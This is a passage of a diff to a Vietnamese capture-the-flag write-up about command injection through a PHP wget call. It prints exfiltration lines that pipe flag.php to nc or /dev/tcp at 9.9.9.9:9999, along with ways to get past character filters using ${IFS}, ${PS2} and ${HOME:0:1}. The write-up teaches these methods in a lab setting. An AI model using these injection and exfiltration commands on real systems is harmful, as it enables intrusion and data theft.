@@ -25,11 +25,11 @@ Author: yakuhito
 - Hướng 1: **Command Injection**
 	+ Như chúng ta có thể thấy biến `$command = "wget -q -O - https://kuhi.to/flag/" . $flag` hoàn toàn có thể cho phép chúng ta thực hiện `command injection`, cụ thể là `command1;command2|command3` với `command1` là chương trình `wget` đề cho, `command2` dùng để đọc nội dung file flag, `command3` dùng để chuyển output của `command2` ra ngoài internet. Đại loại mô hình chung sẽ là **wget -q -O - https://kuhi.to/flag/ ; cat flag.php | nc 9.9.9.9 9999** với `9.9.9.9` và `9999` là địa chỉ ip và port của chúng ta ở ngoài internet. Đến đây chúng ta sẽ cùng giải quyết 1 số vấn đề:
 	+ Đọc file: để đọc được file flag.php chúng ta có thể dùng `cat` (ngoài ra có thể dùng: `tac, head, tail, sort, nl, cut, awk, sed, base64...` sở dĩ có chú thích này vì có cũng có 1 bài tương tự nhưng bài đó họ xóa hết tất cả các chương trình dùng để đọc file nên chúng ta phải tùy cơ ứng biến thôi). Tuy nhiên ở hàm **checkFlag** lại không cho phép chúng ta nhập kí tự `space`, nhưng không sao, đối với `shell injection` thì cái này bypass cũng dễ. 
-	```sh
-	cat${IFS}flag.php
-	cat<flag.php
-	{cat,flag.php}
-	```
+```sh
+cat${IFS}flag.php
+cat<flag.php
+{cat,flag.php}
+```
 	+ Ở đây vì hàm **checkFlag** chỉ cho phép nhập 7 kí tự đặc biệt này `-{_\$.}`
 nên giải pháp sẽ là thay kí tự `space` bằng `${IFS}`.
 	+ Tiếp theo đến đoạn kết nối ra internet thì chúng ta có thể dùng `nc 9.9.9.9 9999`, tuy nhiên kí tự `|` lại không cho được phép. Sau 1 hồi search google thì phát hiện cách này: **cat flag > /dev/tcp/9.9.9.9/9999**, trong đó kí tự ">" sẽ được thay bằng biến môi trường `${PS2}`, kí tự `/` tuy không được phép nhưng có thể thay bằng `${HOME}` (hoặc **${HOME:0:1}**), tuy nhiên cách này cũng fail vì kí tự `>` từ biến môi trường `${PS2}` được xem như là 1 file chứ không phải là kí tự `redirect`. Đến đây chúng ta fail ở việc kết nối 2 command lại với nhau. Vậy thử dụng 1 command kiểu như là:
